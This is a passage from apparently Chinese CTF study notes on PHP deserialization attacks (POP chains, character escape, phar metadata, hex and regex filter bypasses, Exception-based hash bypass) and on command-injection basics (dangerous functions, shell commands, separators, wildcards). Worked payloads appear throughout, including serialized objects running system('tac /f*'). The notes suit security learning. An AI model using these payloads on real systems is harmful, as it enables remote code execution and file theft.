class="comment">//url编码防止有不可见字符&lt;0x00&gt;</span></span><br><span class="line"><span class="comment">//记得将Modifier类中$var属性赋值,因为序列化时会保留成员属性的值,所有直接写在类中就行</span></span><br></pre></td></tr></table></figure>
一样的意思,感觉哪个舒服写哪个<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$one</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$oneone</span>=<span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$two</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$three</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$one</span>-&gt;source=<span class="variable">$oneone</span>;</span><br><span class="line"><span class="variable">$oneone</span>-&gt;str=<span class="variable">$two</span>;</span><br><span class="line"><span class="variable">$two</span>-&gt;p=<span class="variable">$three</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>));</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h3><p><a href="https://www.secpulse.com/archives/165222.html">大佬讲解</a></p>
<ol>
<li><p><strong>什么情况下会产生反序列化逃逸</strong><br>如果开发人员先将用户输入的数据序列化后,再进行过滤或替换,最后再进行反序列化,这样的处理流程可能产生反序列化逃逸<br><code>serialize</code> -&gt; <code>filter</code> -&gt; <code>unserialize</code></p>
</li>
<li><p><strong>原理</strong><br>关键字符在序列化后被过滤替换掉了,但序列化时,会记录字符长度，这个长度是不会变的,在读取字符时,仍会按照原来的长度进行读取.如果过滤后变短了,则会向后读取字符,如果替换后变长了,则会提前终止读取<br>同时反序列化还有一个问题,如果遇到了<code>&#125;</code>就会认为已经结束,后面的字符就会被丢弃<br>可以结合两个特点,控制读取的内容从而达到控制键值对,破坏掉原来的结构,从而实现反序列化逃逸</p>
</li>
<li><p><strong>payload构造</strong><br><code>$_SESSION[&#39;flagphp&#39;]=&#39;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#39;</code><br>如果将这段代码序列化后得到<br><code>a:1:&#123;s:7:&quot;flagphp&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</code><br>原本效果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [flagphp] =&gt;;<span class="attr">s</span>:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;<span class="attr">s</span>:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>如果过滤了flag和php得到<br><code>a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;</code><br>最后效果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="string">&quot;;s:48:] =&gt;1</span></span><br><span class="line"><span class="string">    [img] =&gt; ZDBnM19mMWFnLnBocA==</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h3><ol>
<li><p><strong>什么是phar</strong><br>Phar文件是 PHP 中的一种打包压缩文件，类似于Java中的JAR包。它可以将多个PHP文件打包成一个文件，方便应用程序的打包和组件化。<br>Phar 文件由四个部分组成：</p>
<ol>
<li><strong>Stub</strong>，它可以被解释为一个标记，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER ();?&gt;</code>。前面的内容不受限制，但必须以<code> __HALT_COMPILER ();?&gt;</code> 结尾，否则phar扩展将无法识别该文件为phar文件；</li>
<li><strong>文件清单Manifest</strong>，描述了文件的内容,这里面有个关键概念元数据,元数据(<strong>meta-data</strong>)manifest中的用户自定义数据,它可以包含任意类型的序列化数据，用于存储有关Phar文件的额外信息。当使用<code>phar://</code>伪协议读取phar文件时，元数据会被反序列化，这就是phar反序列化漏洞的成因。</li>
<li><strong>文件内容file contents</strong>,包含了被压缩的文件内容</li>
<li><strong>签名signature</strong>（可选），用于验证 Phar 文件的完整性1。</li>
</ol>
</li>
<li><p><strong>漏洞利用条件</strong><br>什么样的情况下我们会考虑这个漏洞</p>
<ol>
<li>代码本身就存在反序列化漏洞,但是没有<code>unserialize()</code>反序列化函数,可以用这种方式进行反序列化创建对象(实际上这个文件的利用就是为了代替反序列化函数)</li>
<li>使用了文件系统函数（如<code>file_exists()</code>、<code>is_dir()</code>,<code>file_get_contents()</code>，<code>file()</code>,<code>unlink</code>等）且参数可控(参数即为phar文件)，且没有对<code>phar://</code>伪协议进行过滤(这些函数在处理phar文件时,都会触发反序列化)</li>
<li>网站有文件上传的功能,并且只是识别后缀,我们可以上传phar文件,将后缀改成图片.因为使用 PHP 伪协议（例如 phar:&#x2F;&#x2F;）访问一个文件时，PHP 只检查文件的内容而不是文件扩展名来确定它是否为一个有效的 phar 文件。</li>
</ol>
</li>
<li><p><strong>流程</strong></p>
<ol>
<li>先构造pop链,或是其他序列化的字符串,将内容写入phar文件</li>
<li>上传phar文件,并获得文件地址</li>
<li>使用伪协议<code>phar://+文件地址</code>访问,这时候,就会将内容进行反序列化了</li>
</ol>
</li>
<li><p><strong>代码以及代码解释</strong><br>运行下面这段代码,将会生成一个phar文件,这个生成的文件就是我们要上传的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//文件名，后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始缓冲，这意味着对 Phar 文件的修改不会立即写入磁盘</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$pop</span>); <span class="comment">//传入pop链或者序列化字符串,会将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();    </span><br></pre></td></tr></table></figure>
<p>下面是对这段代码每一行的详细解释：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="comment">//使用 PHP 的 Phar 类,创建一个 Phar 对象，用于操作名为 test.phar 的 Phar 文件。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//开始缓冲，这意味着对 Phar 文件的修改不会立即写入磁盘</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//设置 Phar 文件的 stub。stub 是 Phar 文件中的一段代码，它在 Phar 文件被包含或执行时首先运行。在这个例子中，stub 只包含一个 __HALT_COMPILER() 函数调用，它告诉 PHP 解释器停止编译。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$pop</span>);</span><br><span class="line"><span class="comment">//将 $pop 设置 Phar 文件的元数据。元数据是一个任意的序列化变量，它存储在 Phar 文件的 manifest 中。在这个例子中，元数据被设置为变量 $pop 的值。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//向 Phar 文件中添加一个文件。这个方法接受两个参数：文件名和文件内容。在这个例子中，我们向 Phar 文件中添加了一个名为 test.txt 的文件，它的内容为字符串 &quot;test&quot;。</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="comment">//停止缓冲并将修改写入磁盘。这一行代码会将前面对 Phar 文件所做的修改一次性写入磁盘。</span></span><br></pre></td></tr></table></figure>
<p>总之，这段代码创建了一个名为 test.phar 的 Phar 文件，并向其中添加了一个文件和一些元数据</p>
</li>
<li><p><strong>注意点</strong><br>要想使用上面的代码创建phar文件,必须要在php.ini中进行设置,否则会报错<br>我用的是PHPstorm和小皮的环境,生成的文件会在<code>phpstudy_pro\WWW</code>目录下<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230429195822.png" alt="AI的回答"></p>
</li>
</ol>
<h3 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h3><ol>
<li><strong>切入点</strong><br>当代码中存在关键词检测时，将表示字符类型的小写<code>s</code>改为大写<code>S</code>来绕过检测,原理是,序列化字符串中表示字符类型的S为大写时，字符串遇到<code>\+16进制数</code>就会解析<br>例如<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;you are&#x27;</span>.<span class="variable language_">$this</span>-&gt;username.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 未作处理前，会被waf拦截</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//将小s改为大S; 做处理后 \75是u的16进制</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
输出结果<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nonono!!!  //第一个被waf拦截</span><br><span class="line">you are admin   //成功绕过</span><br><span class="line">success</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="原生类-内置类-的利用"><a href="#原生类-内置类-的利用" class="headerlink" title="原生类(内置类)的利用"></a>原生类(内置类)的利用</h3><ol>
<li><p><strong>什么是原生类</strong><br>原生类就是php中内置的类,简单可以理解为,PHP语言帮你定义好了这个类的全部,我们不需要定义写出也能直接实例化<br>原生类和普通类本质上没什么不同,都是由属性和方法(魔术方法)组成,比如之前的Phar也是php的一种原生类<br>原生类是为了帮助开发人员更快的实现一些功能,但是有时候某些原生类处理不当也会带来一些安全问题,这里先介绍几个ctf中比较常见的原生类</p>
</li>
<li><p><strong>Exception类与Error类</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">适用版本</span><br><span class="line">Error：用于PHP7、8。</span><br><span class="line">Exceotion：用于PHP5、7、8</span><br></pre></td></tr></table></figure>
<p>这两个原生类没有很大区别,Error类和Exception类都继承自Throwable接口。两个类都可以用来处理错误和异常情况，但它们的用途不同。Error类表示严重的错误，通常无法恢复，而Exception类表示可以恢复的异常.<br>我们主要利用这两个类中的<code>__tostring</code>魔术方法来构造一些内容去绕过一些比较,或是构造XSS<br><strong>类中的哈希绕过:</strong><br><code>if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))</code><br>由之前的学习可以知道echo一个对象时,由于对象被当成了字符串,会触发<code>__tostring</code>魔术方法,因为函数<code>md5()</code>和<code>sha1()</code>期望接受到的是字符串,所以也会触发<code>__tostring</code><br>因为我们创建的对象不同,但是<code>__tostring</code>返回的内容相同,所以我们可以利用这个来绕过上面的哈希比较<br>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure>
<p>需要注意的是,两个错误类实例化必须要在同一行,因为tostring返回的代码包括了行数<br>解释一下这段代码,<code>$str</code>的内容作为异常信息,异常信息会被tostring返回,所以我们可以控制其中的内容,数字1和2是错误代码,来表示异常的类型或原因,不会被tostring返回<br><code>?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;</code>这段代码是为了配合命令执行漏洞使用,<code>?&gt;</code>是为了实现前面错误信息的闭合,后面可以写入完整的我们想要实现的代码</p>
</li>
</ol>
<h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>如果后端对输入的数据先进行了一些正则匹配的过滤,我们也可以试着采取一些绕过手法</p>
<ol>
<li><p><strong>利用+绕过O</strong><br><code>preg_match(&#39;/^O:\d+/i&#39;,$data)</code>这个正则表达式<code>&#39;/^O:\d+/i&#39;</code>匹配以大写字母O开头，后面紧跟一个或多个数字的字符串<br>如果后端利用这个正则来确保用户输入的不是一个序列化的对象,我们可以使用加号<code>+</code>绕过<br>类似于   O:**+*<em>4:”Test”:1:{s:4:”name”;s:18:”system(‘tac &#x2F;f</em>‘);”;}<br>需要注意的是在url里传参时<code>+</code>要编码为<code>%2B</code>,要不然<code>+</code>会被识别成空格</p>
</li>
<li><p><strong>利用数组绕过O</strong><br>还是适用于前面那种情况,不过把对象放在一个数组中来避免来以O开头</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//结果 a:1:&#123;i:0;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;system(&#x27;tac /f*&#x27;);&quot;;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>匹配}</strong><br><code>preg_match(&#39;/\&#125;$/&#39;,$data)</code>匹配以大括号<code>&#125;</code>结尾的字符串<br>绕过原理 反序列化字符串末尾所有的<code>&#125;</code>是全部可以删掉的，甚至可以末尾填充字符,反序列化时没有影响</p>
</li>
</ol>
<h3 id="不可见字符绕过-类属性不敏感"><a href="#不可见字符绕过-类属性不敏感" class="headerlink" title="不可见字符绕过(类属性不敏感)"></a>不可见字符绕过(类属性不敏感)</h3><p>对此相当无语,如果对输入进行了过滤,过滤了不可见字符,也就意味着<code>&lt;0x00&gt;</code>也是被过滤的,如果类中有受保护或者私有属性,序列化不可避免的会有<code>&lt;0x00&gt;</code>这时候试着将属性的类型改成<code>public</code>再进行实例化<br>因为PHP7.1+对类的属性类型不敏感,你传进去<code>public</code>代替其他两种也没事,这个没有不可见字符</p>
<h3 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h3>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行与代码执行漏洞</title>
    <url>/2023/04/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><p><strong>原理</strong>:开发者为了实现网站的一些特殊功能时(比如ping命令)需要使用一些特殊函数,这些函数可以执行系统命令,如果没有进行严格的过滤,那么用户就可以通过这个函数实现一些危险的命令,或者加入一些危险的参数,从而获取信息</p>
<h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><p>这些函数如果可以被用户注入命令,就会带来危险性,写了个大概意思,具体参考<a href="https://www.php.net/manual/zh/index.php">php文档</a></p>
<h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><ol>
<li><strong>作用</strong>:<br>执行外部程序，并且显示输出<br>system()函数用于向操作系统传递控制台命令行，以Windows系统为例，通过system()函数执行命令和在cmd窗口中执行命令的效果是一样的</li>
<li><strong>注意</strong><br>命令必须是字符串的形式</li>
</ol>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>与system()类似,执行系统命令,返回最后一行数据,但不显示输出</p>
<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>通过shell执行命令,返回全部数据,但不显示输出,这个函数等同于执行运算符(反引号)</p>
<h3 id="96-96-反引号"><a href="#96-96-反引号" class="headerlink" title="&#96;&#96;(反引号)"></a>&#96;&#96;(反引号)</h3><p>在php中称之为执行运算符，PHP将尝试将反引号中的内容作为shell命令来执行，并返回数据</p>
<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p>passthru直接将结果输出到浏览器，不返回数据，且其可以输出二进制，比如图像数据。</p>
<h3 id="popen-command-mode"><a href="#popen-command-mode" class="headerlink" title="popen(command,mode)"></a>popen(command,mode)</h3><p>打开进程文件指针<br>函数需要两个参数，执行命令:<code>command</code>，文件的连接模式:<code>mode</code>，有r和w代表读和写。<br>函数会执行command命令,但不会返回执行结果，而是返回一个文件指针,想要去获取命令执行的结果,就类似于操作文件去获取</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;whoami&quot;</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popen打开一个进程通道,类似于$fp=fopen(),命令结果在这个文件里  </span></span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//判断是否到EOF  </span></span><br><span class="line">        <span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>);   <span class="comment">//将命令的结果逐行遍历</span></span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$out</span>;         <span class="comment">//打印出结果  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);  <span class="comment">//关闭通道,类似于关闭文件</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><p>执行一个命令，并且打开用来输入&#x2F;输出的文件指针。<br>类似popen()函数，但是proc_open()提供了更加强大的控制程序执行的能力。</p>
<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><p>在当前进程空间执行指定程序</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ol start="0">
<li><strong>cat</strong><br>命令用于连接文件并打印到标准输出设备上,可以知道文件内容,但是经常被过滤吧</li>
<li><strong>cd</strong>：切换当前工作目录；<br>用法：cd 后面加目录</li>
<li><strong>ls</strong>：显示指定工作目录下的内容；<br>用法：ls 文件或路径</li>
<li><strong>dir</strong>: 显示指定工作目录下的内容<br>和<code>ls</code>类似,同于<code>ls -C -b</code>,在<code>ls</code>被过滤时是一个不错的选择</li>
<li><strong>cp</strong>：拷贝文件；<br>用法：cp 要复制的文件 目标路径&#x2F;新的名字</li>
<li><strong>echo</strong>：输出<br>用法：输入什么就打印什么,可以配合管道符<code>|</code>使用,也可以配合反引号内联执行<br><code>echo &gt; 1.txt</code> 将输出的内容重定向到文件中,表示覆盖后写入<br><code>echo &gt;&gt; 1.txt</code>：将输出的内容重定向到文件中,表示追加写入</li>
<li>**find [path] [expression]**：<br>查找指定文件；用法：find 目录 -name 文件<br><code>path</code>是要查找的目录路径，可以是一个目录或文件名，也可以是多个路径，如果未指定路径，则默认为当前目录<br><code>expression</code> 是可选参数，用于指定查找的条件，可以是文件名、文件类型、文件大小等等。<br>例如:<code>find /home -name “*.txt”</code><br>查找&#x2F;home目录下，所有以.txt 结尾的文件或者目录<br><code>-name</code>:是按文件名查找，支持使用通配符 * 和 ?。</li>
<li><strong>pwd</strong>：<br>显示当前所在的目录</li>
<li><strong>more</strong>:<br>命令类似cat，不过会以一页一页的形式显示</li>
<li><strong>less</strong>:<br>与<code>more</code>类似</li>
<li><strong>head</strong>:<br>查看头几行</li>
<li><strong>tac</strong>:<br>从最后一行开始显示，可以看出 tac 是 cat 的反向显示(是从最后一行输出,不是每一行逆序输出)</li>
<li><strong>tail</strong>:<br>查看尾几行</li>
<li><strong>nl</strong>：<br>可以显示出文件内容的，而且输出行号</li>
<li><strong>od</strong>:<br>od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来,八进制三个为一组<br>使用<code>od -c</code>可以使内容以原本的形式显示</li>
<li><strong>vi</strong>:<br>文本编辑器，这个也可以查看</li>
<li><strong>vim</strong>:<br>Vim是从vi发展出来的一个文本编辑器，这个也可以查看<br><a href="https://www.runoob.com/linux/linux-vim.html">可以去菜鸟教程详细学习</a></li>
<li><strong>sort</strong>:<br>sort可针对文本文件的内容，以行为单位来排序,可以查看文件</li>
<li><strong>uniq</strong>:<br>uniq 可检查文本文件中重复出现的行列,可以查看文件,但是重复内容只会显示一个</li>
<li><strong>file -f</strong>:<br>会将文件内容以报错的形式显示出来</li>
<li><strong>grep</strong>:<br>用于查找文件里符合条件的字符串或正则表达式,并打印匹配的行：<br>例如:<br><code>grep a 1.txt</code>  在文件1.txt中查找字符”a”，并打印匹配的行：<br><code>grep test *txt</code> 表示在当前目录中,包含<code>test</code>字符串的txt文件,，并打印出该字符串的行。</li>
</ol>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>cd：切换目录<br>D:：跳转到其他硬盘<br>ping：测试IP<br>ipconfig：查看网络详情，类似于linux的ifconfig<br>dir：显示目录中的文件内容，类似于linux的ls<br>type：查看文件，类似于linux的cat、less、more；用法：type 文件名<br>md：创建文件夹，类似于linux的mkdir；用法：md 目录名<br>tree：查看目录结构<br>copy：复制文本文件；用法：copy 文件1 文件2<br>注：<br>参数&#x2F;b指定以二进制格式复制、合并文件，用于图像类&#x2F;声音类文件<br>参数&#x2F;a指定以ASCII格式复制、合并文件，用于txt等文档类文件<br>net start 服务名；net stop 服务名<br>cls：清空cmd命令行，类似于linux的clear<br>ctrl+C：结束或退出cmd正在执行的脚本<br>find：查找<br>find &#x2F;c “所要搜索的文件所包含的字符串” 文件的绝对路径<br>for：对一个或一组文件，字符串或命令结果中的每一个对象执行特定命令<br>（1）找出C盘下的所有文件，并将所有文件名都输出出来<br>for &#x2F;r C: %i in (<em>) do @echo %i<br>（2）找出C盘下所有后缀是.txt的文件，并将其输出<br>for &#x2F;r C: %i in (</em>.txt) do @echo %i<br>（3）找出C盘下所有后缀是.txt和.jpg的文件，并将其输出<br>for &#x2F;r C: %i in (<em>.txt,</em>.jpg) do @echo %i</p>
<h2 id="命令分隔符-连接符"><a href="#命令分隔符-连接符" class="headerlink" title="命令分隔符(连接符)"></a>命令分隔符(连接符)</h2><p>命令分隔符,就是用来分隔命令的,在两句命令中加入不同的符号,效果也不相同,在Windows和Linux两种不同的操作系统中也略有区别<br>我们主要用分割符来拼接语句,所以,我们更关心后面的语句能否执行</p>
<ol>
<li><code>|</code><br>在Windows中,会直接执行后面的语句,但如果前段语句为假,则后面的语句也无法执行<br>在Linux中,是作为管道符，管道符左边命令的输出就会作为管道符右边命令的输入,无论前面真假,显示后面的执行结果</li>
<li><code>&amp;</code><br>无论前面的语句的真假,后面的语句都可以执行</li>
<li><code>&amp;&amp;</code><br>前面为假,则后面不执行</li>
<li><code>||</code><br>前面为真,则后面不执行</li>
<li><code>;</code>分号<br>Linux特有的命令连接,前面执行完前面的语句再执行后面的,也就是说,无论前面的真假,后面都会执行</li>
</ol>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ol>
<li><strong>作用</strong><br>通配符用来模糊搜索文件。当<strong>不知道真正字符</strong>或者懒得输入完整名字时，常常使用通配符代替一个或多个真正的字符,或者在ctf中,关键字被过滤,也可以用通配符来替代</li>
<li><code>?</code>	<br>匹配<strong>一个</strong>任意字符,如<code>fl?g</code>可以匹配成<code>flag</code>,<code>flbg</code>等</li>
<li><code>*</code>	<br>匹配0个或<strong>多个</strong>任意字符，也就是可以匹配任意内容,如<code>f*g</code>,匹配成以f开头,g结尾的所有字符</li>
<li><code>[]</code><br>Linux里有这个通配符,而Windows没有<br>匹配<strong>括号中指定</strong>的任意<strong>一个</strong>字符,如<code>fl[abc]g</code>可以匹配到<code>flag</code>,<code>flbg</code>,<code>flcg</code><br><strong>扩展</strong>:<br>[-]	匹配括号中范围内的任意一个字符，如<code>a-c</code>代表范围a到c<br>[^]	逻辑非，表示匹配不是括号内的一个字符</li>
<li><strong>注意</strong><br>反斜杠<code>\</code>或单引号<code>&#39;</code>双引号<code>&quot;</code>都会使通配符失效。<br>如: <code>\*</code>, <code>&quot;*&quot;</code>, <code>&#39;*&#39;</code>都表示<code>*</code>本身，不通配任何文件。</li>
</ol>
